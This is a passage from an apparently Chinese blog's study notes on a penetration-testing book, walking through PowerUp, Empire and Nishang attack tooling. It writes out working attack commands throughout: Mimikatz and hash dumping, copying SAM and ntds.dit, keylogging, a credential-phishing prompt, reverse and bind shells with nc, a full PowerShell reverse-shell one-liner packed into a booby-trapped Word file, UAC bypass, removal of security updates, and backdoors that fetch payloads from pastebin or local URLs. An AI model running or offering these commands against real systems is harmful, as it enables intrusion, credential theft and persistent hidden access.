+<p>模块用于生成一个安装文件，运行这个安装文件后会弹出添加用户的对话框，执行命令<code>write-useraddmsi</code></p>
+</li>
+<li><p>Write-ServiceBinary</p>
+<p>模块用于预编译C#服务的可执行文件，默认创建一个管理员账户，可通过command定制自己的命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 添加默认账户</span><br><span class="hljs-built_in">write-servicebinary</span> <span class="hljs-literal">-servicename</span> 服务<br><span class="hljs-comment"># 指定添加域账户</span><br><span class="hljs-built_in">write-servicebinary</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-username</span> <span class="hljs-string">&quot;TMP\john&quot;</span><br><span class="hljs-comment"># 指定添加用户，用户密码以及添加的用户组</span><br><span class="hljs-built_in">write-servicebinary</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-username</span> one <span class="hljs-literal">-password</span> password<br><span class="hljs-comment"># 自定义执行命令</span><br><span class="hljs-built_in">write-servicebinary</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-command</span> <span class="hljs-string">&quot;net&quot;</span><br></code></pre></div></td></tr></table></figure></li>
+<li><p>Install-ServiceBinary</p>
+<p>模块通过write-servicebinary写一个C#服务来添加用户，执行命令如下</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">install-servicebinary</span> <span class="hljs-literal">-servicename</span> dhcp<br><span class="hljs-built_in">install-servicebinary</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-username</span> <span class="hljs-string">&quot;TMP\john&quot;</span><br><span class="hljs-built_in">install-servicebinary</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-username</span> tmp <span class="hljs-literal">-password</span> password<br><span class="hljs-built_in">install-servicebinary</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-command</span> <span class="hljs-string">&quot;net....&quot;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>与write-ServiceBinary不同的是，write生成可执行文件，install直接按照服务</p>
+</li>
+</ol>
+<h3 id="2-3-PowerUp攻击模块实战演练"><a href="#2-3-PowerUp攻击模块实战演练" class="headerlink" title="2.3 PowerUp攻击模块实战演练"></a>2.3 PowerUp攻击模块实战演练</h3><p>常用模块介绍</p>
+<h4 id="2-3-1-实战一"><a href="#2-3-1-实战一" class="headerlink" title="2.3.1 实战一"></a>2.3.1 实战一</h4><p>未完待续</p>
+<h2 id="3-Empire"><a href="#3-Empire" class="headerlink" title="3. Empire"></a>3. Empire</h2><p>Empire是一款针对Windows平台的、使用PowerShell脚本作为攻击载荷的渗透攻击框架工具，具有从stager生成、提权到渗透维持的一系列功能。Empire实现了无需powershell.exe就可运行PowerShell代理的功能，还可以快速在后期部署漏洞利用模块，其内置模块有键盘记录、Mimikatz、绕过UAC、内网扫描等，并且能够躲避网络检测和大部分安全防护工具的查杀，简单来说有点类似于Metasploit，是一个基于PowerShell的远程控制木马</p>
+<p>Empire的功能可参考官方网站 <a target="_blank" rel="noopener" href="http://www.powershellempire.com/">http://www.powershellempire.com/</a></p>
+<h3 id="3-1-Empire-的安装"><a href="#3-1-Empire-的安装" class="headerlink" title="3.1 Empire 的安装"></a>3.1 Empire 的安装</h3><p>Empire 运行在Linux平台上，首先使用git命令下载程序目录</p>
+<p><code>git clone https://github.com/BC-SECURITY/Empire.git</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 进入下载的目录</span><br><span class="hljs-built_in">cd</span> Empire <br><span class="hljs-built_in">cd</span> setup<br><span class="hljs-comment"># 安装</span><br>sudo ./install.sh<br><span class="hljs-comment"># 安装完成后可以在Empire目录下输入./empire即可打开Empire</span><br>./empire<br></code></pre></div></td></tr></table></figure>
+
+<p>界面如图</p>
+<h3 id="3-2-设置监听"><a href="#3-2-设置监听" class="headerlink" title="3.2 设置监听"></a>3.2 设置监听</h3><p>运行Empire后，首先使用help查看使用帮助</p>
+<p>Empire类似于Metasploit，同样是设置监听后生成木马，之后目标机运行木马后，我们的监听会连接反弹的代理</p>
+<p>建立监听：输入listeners命令进入监听线程界面，输入help查看帮助文件</p>
+<p>之后输入uselistener来设置采用的具体模式。双击Tab键可以看到一共有7种模式</p>
+<p>这里采用http监听模式，输入<code>uselistener http</code> ,然后输入info命令查看具体参数设置使用set进行设置 <code>set name shuteer</code> <code>set host (empire所在的服务器IP)</code></p>
+<p>设置后可输入info进行检查，之后输入execute命令即可开始监听，back返回上一层listeners界面，list命令可列出当前激活的listener，kill+name命令可以删除该监听</p>
+<h3 id="3-3-生成木马"><a href="#3-3-生成木马" class="headerlink" title="3.3 生成木马"></a>3.3 生成木马</h3><p>可以将该部分理解为Metasploit里的Payload、Empire中输入usetstager来设置使用何种模块，同样双击Tab键可以看到具体的板块</p>
+<p>以下是常用类型的木马</p>
+<ol>
+<li><p>DLL木马</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 设置类型</span><br>usestager windows/dll<br><span class="hljs-comment"># 查看设置 </span><br>info<br><span class="hljs-comment"># set listener sh</span><br></code></pre></div></td></tr></table></figure></li>
+<li><p>未完待续(等安装成功后尝试)</p>
+</li>
+</ol>
+<h2 id="4-Nishang"><a href="#4-Nishang" class="headerlink" title="4.Nishang"></a>4.Nishang</h2><p>Nishang是一款针对PowerShell的渗透工具。它基于PowerShell的渗透测试专用工具，集成了框架、脚本和各种Payload，包括了下载和执行、键盘记录、DNS、延时命令等脚本。下载地址为https: //github.com/samratashok/nishang</p>
+<p>导入模块<code>Import-Module .\nishang.psm1</code></p>
+<p>输入<code> Get-Command -Module nishang</code>可以查看具体的模块，内容部分如下</p>
+<p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210813144245.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>执行<code>get-information</code>将获取大量目标机器的信息，可以将结果导出到txt文件中，命令如下<code>Get-Information | Out-File D:\re.txt</code></p>
+<p>Nishang模块说明</p>
+<table>
+<thead>
+<tr>
+<th>模块</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Antak-WebShell</td>
+<td>WebShell</td>
+</tr>
+<tr>
+<td>Backdoors</td>
+<td>后门</td>
+</tr>
+<tr>
+<td>Client</td>
+<td>客户端</td>
+</tr>
+<tr>
+<td>Escalation</td>
+<td>提权</td>
+</tr>
+<tr>
+<td>Execution</td>
+<td>RCE</td>
+</tr>
+<tr>
+<td>Gather</td>
+<td>信息收集</td>
+</tr>
+<tr>
+<td>Misc</td>
+<td>杂项</td>
+</tr>
+<tr>
+<td>Pivot</td>
+<td>跳板/远程执行exe</td>
+</tr>
+<tr>
+<td>Scan</td>
+<td>扫描</td>
+</tr>
+<tr>
+<td>powerpreter</td>
+<td>Meterpreter会话</td>
+</tr>
+</tbody></table>
+<h3 id="4-1-实战模块"><a href="#4-1-实战模块" class="headerlink" title="4.1 实战模块"></a>4.1 实战模块</h3><p>对于部分模块进行讲解</p>
+<ol>
+<li><p>Check-VM</p>
+<p>对于目标机是否是虚拟机进行判断，方法是通过检测已知的虚拟机指纹进行判断<img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210813164935.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>Invoke-CredentialsPhish</p>
+<p>命令执行后效果如下<img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210813165945.png" srcset="/img/loading.gif" lazyload></p>
+<p>该脚本的功能很强大，因为不输入正确密码就关闭不了对话框，只能强制结束进程,这里成功得到明文的管理员账号密码<img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210813170124.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>Copy-VSS</p>
+<p>脚本利用Volume Shadow Copy服务复制sam文件，如果脚本运行在DC机上，ntds.dit和SYSTEM hive也能进行拷贝</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 直接保存在当前路径下</span><br><span class="hljs-built_in">Copy-VSS</span><br><span class="hljs-comment"># 指定位置</span><br><span class="hljs-built_in">Copy-VSS</span> <span class="hljs-literal">-DestinationDir</span> F:<br></code></pre></div></td></tr></table></figure></li>
+<li><p>FireBuster FireListener扫描器</p>
+<p>用于对内网进行扫描，打开本地监听，然后远程传送数据，把包发给FireListener</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 首先在本机运行FireListener</span><br>FireListener <span class="hljs-number">130</span><span class="hljs-literal">-150</span><br><span class="hljs-comment"># 目标机</span><br>FireBuster <span class="hljs-number">192.168</span>.<span class="hljs-number">66.66</span> <span class="hljs-number">130</span><span class="hljs-literal">-150</span> <span class="hljs-literal">-Verbose</span><br></code></pre></div></td></tr></table></figure></li>
+<li><p>Keylogger</p>
+<p>首先执行帮助命令进行查看<code> Get-Help .\Gather\Keylogger.ps1 -full</code><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210813171128.png" srcset="/img/loading.gif" lazyload></p>
+<p>对于上述中的第一方法进行讲述</p>
+<p>第一种：使用这种方式运行,键盘记录会被保存在当前用户Temp目录下的key文件中</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 运行脚本</span><br>.\Gather\Keylogger.ps1<br><span class="hljs-comment"># 填写参数</span><br>CheckURL:  http://pastebin.com/raw.php?i=jqP2vJ3x <span class="hljs-comment"># 表示需要检查的网页url</span><br>MagicString: stopthis <span class="hljs-comment"># 检测url中是否包含字符，如果包含就停止记录</span><br><span class="hljs-comment"># 停不下来，，，，，，也不知道为啥</span><br><br><span class="hljs-comment"># 读取文件到当前目录下vh</span><br>Parse_Keys C:\Users\bsms\AppData\Local\Temp\key.log pass.txt<br></code></pre></div></td></tr></table></figure></li>
+<li><p>Invoke-Mimikatz</p>
+<p>参考命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># Dump出本机的凭证信息</span><br><span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-DumpCreds</span><br><span class="hljs-comment"># Dump出远程计算机的凭证信息</span><br><span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-DumpCreds</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-selector-tag">@</span>(<span class="hljs-string">&quot;NAME&quot;</span>)<br><span class="hljs-comment"># 在远程计算机上运行Mimikatz并执行privilege: debug exit</span><br><span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;privilege: debug exit&quot;</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-string">&quot;Name&quot;</span><br></code></pre></div></td></tr></table></figure></li>
+<li><p>Get-PassHashes</p>
+<p>脚本在管理员权限下可Dump出密码哈希值</p>
+<p>命令<code> Get-PassHashes</code></p>
+<p>最后展示的结果是所有的用户都是同一个值？？？？？why</p>
+</li>
+<li><p>获取用户的密码提示信息</p>
+<p>命令<code>Get-PassHints</code></p>
+</li>
+</ol>
+<h3 id="4-2-PowerShell隐藏通信隧道"><a href="#4-2-PowerShell隐藏通信隧道" class="headerlink" title="4.2 PowerShell隐藏通信隧道"></a>4.2 PowerShell隐藏通信隧道</h3><ol>
+<li><p>基于TCP协议的PowerShell交互式Shell</p>
+<p>Invoke-PowerShellTcp可以是实现PowerShell的正向或反向连接Shell，具体参数</p>
+<ul>
+<li>IPAddress &lt;string&gt; ：选择-Reverse选项时表示需要连接的IP地址</li>
+<li>Port&lt;int32&gt;：选择-Reverse选项时表示要连接的端口，选择-Bind选项表示要监听的端口</li>
+<li>Reverse[&lt;SwitchParameter&gt;] ：反向连接</li>
+<li>Bind [&lt;SwitchParameter&gt;]：正向连接</li>
+</ul>
+<ol>
+<li><p>反向连接</p>
+<p>使用NC监听本地6666端口（需要先监听再执行脚本）</p>
+<p>命令<code>nc -lvp 6666</code></p>
+<p>之后在目标机PowerShell执行以下命令</p>
+<p><code> Invoke-PowerShellTcp -Reverse -IPAddress 192.168.66.66 -Port 6666</code><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210814154242.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>正向连接</p>
+<p>在目标机PowerShell执行以下命令</p>
+<p><code>Invoke-PowerShellTcp -Bind -Port 3333</code></p>
+<p>在NC下执行以下命令，连接目标机的3333端口</p>
+<p><code>nv -nv  192.168.66.66 3333</code></p>
+<p>结果如图<img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210814154945.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ol>
+</li>
+<li><p>基于UDP协议的PowerShell交互式Shell</p>
+<p>Invoke-PowerShellUdp是基于Udp协议的PowerShell正向或反向连接</p>
+<p>具体使用方法与TCP的类似，其中nc命令参考如下</p>
+<p>正向连接：<code>nc -nvu 192.168.66.66 6666</code></p>
+<p>反向连接：<code>nc -lup 6666</code></p>
+<p><strong>知识点</strong>：查看windows和linux1的各种命令解析，推荐网址-<a target="_blank" rel="noopener" href="https://www.explainshell.com/">https://www.explainshell.com/</a></p>
+</li>
+<li><p>基于HTTP和HTTPS协议的PowerShell交互式Shell</p>
+<p>Invoke-PoshRatHttp和Invoke-PoshRatHttps是基于HTTP和HTTPS协议的PowerShell反向连接Shell，命令如下</p>
+<p>HTTP:<code>Invoke-PoshRatHttp -IPAddress 192.168.66.132 -Port 6666</code></p>
+<p>始终报错：Something went wrong! Check if client could reach the server and using the correct port.</p>
+<p>HTTPS:<code>Invoke-PoshRatHttp -IPAddress 192.168.66.132 -Port 6666</code></p>
+<p>之后是将生成的命令复制到目标机CMD中执行，成功后命令行会自动消失，然后在本机PowerShell下会返回目标机IP为192.168.12.107(即目标机)的会话。</p>
+</li>
+</ol>
+<h3 id="4-3-WebShell后门"><a href="#4-3-WebShell后门" class="headerlink" title="4.3 WebShell后门"></a>4.3 WebShell后门</h3><p>模块只有一个ASPX的“大马”，可以使用该WebShell编码执行脚本，上传下载文件</p>
+<h3 id="4-4-权限提升"><a href="#4-4-权限提升" class="headerlink" title="4.4 权限提升"></a>4.4 权限提升</h3><ol>
+<li><p>下载执行</p>
+<p>Download_Execute是Nishang中的下载执行脚本，用于下载文本文件，然后转化为可执行文件执行</p>
+<p>利用Metasploit生成木马，再先利用ExetoText模块将exe文件转化为txt文件</p>
+<p><code>ExetoText .\win.exe F:\win.txt</code></p>
+<p>之后执行命令进行下载执行<code>Download_Execute http://127.0.0.1/win.txt</code>执行成功后能够在Metasploit监听端口获得反弹回来的Shell。</p>
+</li>
+<li><p>Bypass UAC</p>
+<p> User Account Control(用户账户控制)会要求用户在执行可能会影响计算机运行或其他用户设置的操作之前，提供权限。通过在这些操作执行前对其进行验证，在未经许可的情况下，UAC可以防止恶意软件和间谍软件在计算机上进行安装或对计算机进行更改</p>
+<p> 在Windows Vista以及更高的版本中，微软引进了安全控制策略，分为高、中、低三个等级。高等级的进程具有管理员权限，中等级进程拥有一个基本用户的权限，低级别进程的权限受各种限制，用来保证在系统受到威胁时，使损害保持在最小。<br> UAC需要授权的动作：</p>
+<ul>
+<li>配置Windows Update</li>
+<li>增加或删除用户账户</li>
+<li>改变用户的账户类型</li>
+<li>改变UAC设置</li>
+<li>安装ActiveX</li>
+<li>安装或卸载程序</li>
+<li>安装设备驱动程序</li>
+<li>设置家长控制</li>
+<li>将文件移动或复制到Program Files或Windows命令</li>
+<li>查看其它用户的文件夹</li>
+</ul>
+<p> UAC有4种设置要求</p>
+<ol>
+<li>始终通知：最严格的设置，任何时候，当有程序要使用高级别权限时，都会提示本地用户</li>
+<li>仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。本地<br> Windows程序要使用高级别权限时，不通知用户。但当第三方程序要求使用高级别权限时，会提示本地用户</li>
+<li>仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但提示用户时不降低桌面的亮度</li>
+<li>从不提示：当用户为系统管理员时，所有程序都会以最高权限运行</li>
+</ol>
+<p> Invoke-PsUACme模块使用了UACME项目的DLL来绕过UAC，具体如下图</p>
+<p> <img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210814214055.png" srcset="/img/loading.gif" lazyload></p>
+<p> 具体执行方式</p>
+ <figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 使用Sysprep方法并执行默认的Payload</span><br><span class="hljs-built_in">Invoke-PsUACme</span> <span class="hljs-literal">-Verbose</span><br><span class="hljs-comment"># 使用oobe方法并执行默认Payload</span><br><span class="hljs-built_in">Invoke-PsUACme</span> <span class="hljs-literal">-method</span> oobe <span class="hljs-literal">-Verbose</span><br><span class="hljs-comment"># 使用默认方法执行指定Payload </span><br><span class="hljs-built_in">Invoke-PsUACme</span> <span class="hljs-literal">-Payload</span> <span class="hljs-string">&quot;命令&quot;</span><br><span class="hljs-comment"># 还可以利用PayloadPath参数指定Payload路径，还可使用-CustomDll64或-CustomDll32自定义一个DLL文件</span><br></code></pre></div></td></tr></table></figure></li>
+<li><p>删除补丁</p>
+<p> 使用Remove-Updata可以移除系统的更新</p>
+ <figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 移除机器上所有更新</span><br><span class="hljs-built_in">Remove-Update</span> All<br><span class="hljs-comment"># 移除机器上所有与安全相关更新</span><br><span class="hljs-built_in">Remove-Update</span> Security<br><span class="hljs-comment"># 利用systeminfo查看目标机的更新情况</span><br>systeminfo<br><span class="hljs-comment"># 移除指定编号的更新</span><br><span class="hljs-built_in">Remove-Update</span> KB***<br></code></pre></div></td></tr></table></figure></li>
+<li><p>其他功能</p>
+<ol>
+<li><p>端口扫描(Invoke-PortScan)</p>
+<p> 模块用于发现主机、解析主机、端口扫描</p>
+<p> ` Invoke-PortScan [-StartAddress] <String> [-EndAddress] <String> [-ResolveHost] [-ScanPort] [-Ports &lt;Int32[]&gt;] [-Tim</p>
+<div class="hljs code-wrapper"><pre><code> eOut &lt;Int32&gt;] [&lt;CommonParameters&gt;]`
+</code></pre></div>
+<p> 部分参数介绍</p>
+<ul>
+<li>StartAddress：扫描范围开始的地址</li>
+<li>EndAddress：扫描范围结束的地址</li>
+<li>ScanPort：进行端口扫描</li>
+<li>Port：指定扫描端口</li>
+<li>TimeOut：设置超时时间</li>
+</ul>
+<p> 扫描存活主机并解析主机名<code> Invoke-PortScan -StartAddress 192.168.66.1 -EndAddress 192.168.66.255 -ResolveHos</code></p>
+<p> <img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210814221033.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>爆破破解(Invoke-BruteForce)</p>
+<p> Invoke-BruteForce是Nishang中暴力破解的脚本，用于SQL Server、域控制器、Web、以及FTP弱口令爆破</p>
+<p> <code>Invoke-BruteForce [-ComputerName] &lt;String&gt; [-UserList] &lt;String&gt; [-PasswordList] &lt;String&gt; [-Service] &lt;String&gt; [[-StopOnSuccess]] [[-Jitter] &lt;Double&gt;] [[-Delay] &lt;UInt32&gt;] [&lt;CommonParameters&gt;]</code></p>
+<p> <img src="https://s3.bmp.ovh/imgs/2021/08/137f39ac8ae1ccd8.png" srcset="/img/loading.gif" lazyload></p>
+<p> 参数介绍</p>
+<ul>
+<li>ComputerName：对应服务的计算机名</li>
+<li>UserList：用户名字典</li>
+<li>PasswordList：密码字典</li>
+<li>Service(默认为SQL)</li>
+<li>StopOnSuccess：匹配一个后停止</li>
+<li>Delay：延迟时间</li>
+</ul>
+</li>
+<li><p>嗅探</p>
+<p> 内网中嗅探方法简单，但是动静较大</p>
+<p> 模块命令</p>
+<p> ` Invoke-Interceptor [[-ListenPort] <Int32>] [[-ProxyServer] <String>] [[-ProxyPort] <Int32>] [[-Tamper]] [[-HostCA]] [[-AutoProxyConfig]] [[-Cleanup]] [[-SearchString] <String>] [[-ReplaceString] <String>]</p>
+<div class="hljs code-wrapper"><pre><code>  [[-Domains] &lt;String&gt;] [[-LogFile] &lt;String&gt;] [&lt;CommonParameters&gt;]`
+</code></pre></div>
+<p> 目标机执行以下命令<code>Invoke-Interceptor -ProxyServer 192.168.66.66 -ProxyPort 6666</code></p>
+<p> 本机监听对应端口 <code>nc -lvvp 6666</code></p>
+</li>
+<li><p>屏幕窃取</p>
+<p> Show-TargetScreen脚本使用MJPEG传输目标机远程桌面的实时画面,在本机可以使用NC或者PowerCat进行监听。在本地使用支持MJPEG的浏览器(如Firefox）访问本机对应监听端口，即可在浏览器上看到从远端传输回来的实时画面,正向反向均可。<br> 执行方式:</p>
+<p> 将远程的画面传送到192.168.66.132的443端口</p>
+<p> <code>Show-TargetScreen -Reverse -lPAddress 192.168.66.132 -Port 443</code><br> 具体参数如下</p>
+<ul>
+<li>IPAddress：后面加IP地址</li>
+<li>Port：加端口</li>
+<li>Bind：正向连接</li>
+</ul>
+<p> 反向连接窃取屏幕</p>
+<p> 在本机输入命令之后访问对应端口即可窃取</p>
+<p> <code>nc -nlvp 443|nc -nlvp 6666</code></p>
+<p> <img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210815013904.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>生成木马</p>
+<p> 生成木马的脚本使用方法基本相同，这里以生成收污染的Word为例</p>
+<p> 参数介绍</p>
+<ul>
+<li>Payload：后面加Payload</li>
+<li>Payload：传入远程Payload进行生成</li>
+<li>PayloadScript：指定本地的脚本生成</li>
+<li>Arguments：之后要执行的函数（是Payload有的函数）</li>
+<li>OutputFile：输出的文件名</li>
+<li>WordFileDir：输出的目录地址</li>
+<li>Recurse：在WordFileDir中递归寻找Word文件</li>
+<li>RemoveDocx：创建完成后删除原始文件</li>
+</ul>
+<p> 首先监听本地端口</p>
+<p> <code>nc -lvp 4666</code></p>
+<p> 之后将nishang\shells\invoke-powershelltcponeline.ps1中的第三行文件修改远端地址，之后复制输入以下内容</p>
+<p> <code> Invoke-Encode -DataToEncode &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;IP地址&#39;,6056);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot; -IsString -PostScript</code></p>
+<p> 之后会在当前目录生成两个文件，一个是encoded.txt，另一个是encodedcommand.txt</p>
+<p> 接着执行<code>Out-Word -PayloadScript .\encodedcommand.txt</code>后应该会有一个当前目录下的Salary_Details.doc文件，目标用户打开word之后会反弹Shell</p>
+</li>
+<li><p>后门</p>
+<ol>
+<li><p>HTTP-Backdoor</p>
+<p> HTTP-Backdoor以在目标机器上下载和执行PowerShell脚本，接收来自第三方网站的指令，然后在内存中执行PowerShell脚本，其语法如下所示。<br> <code>HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL  http://pastebin.com/raw.php?i=Zhyf8rwh -MagicString start123 -StopString stopthis</code><br> 具体的参数介绍如下所示</p>
+<ul>
+<li>CheckURL：给出一个URL地址，如果存在，MagicString中的值就执行Payload来下载、运行我们的脚本</li>
+<li>PayloadURL：给出需要下载的PowerShell脚本的地址</li>
+<li>Arguments：指定要执行的函数</li>
+<li>StopString：判断是否存在CheckURL返回的字符串，如果存在则停止执行</li>
+</ul>
+</li>
+<li><p>Add-ScrnSaveBackdoor</p>
+<p> 脚本利用windows的屏保来留下一个隐藏的后门，执行方式如下</p>
+<p> <code>Add-ScrnSaveBackdoor -Payload &quot;shell.exe -命令&quot;</code></p>
+<p> 使用msfvenom生成一个PowerShell，之后使用命令返回Meterpreter</p>
+</li>
+<li><p>Execute-OnTime</p>
+<p> Execute-OnTime在目标机上指定PowerShell脚本的执行时间，与HTTP-Backdoor使用方式相似，执行方式如下</p>
+<p> <code>Execute-Ontime -PayloadURL  http://pastebin.com/raw.php?i=Zhyf8rwh Get-Information -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x  -MagicString start123 -StopString stopthis</code></p>
+</li>
+<li><p>Invoke-ADSBackdoor</p>
+<p> 脚本使用NTFS数据流留下一个<strong>永久性</strong>的后门且不易被发现</p>
+<p> 脚本向ADS中注入代码并且以普通用户的权限运行，输出以下命令即可执行脚本</p>
+<p> <code>Invoke-ADSBackdoor -PayloadURL http://192.168.11.11/tmp.ps1</code></p>
+<p> 使用命令dir /a /r才能看到被写入的文件</p>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%B9%A6%E7%B1%8D-Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/">书籍 Web安全攻防-渗透测试实战指南</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%B9%A6%E7%B1%8D/">书籍</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <i class="iconfont icon-love"></i> <a href="/" target="_blank" rel="nofollow noopener"><span>MyBlog</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
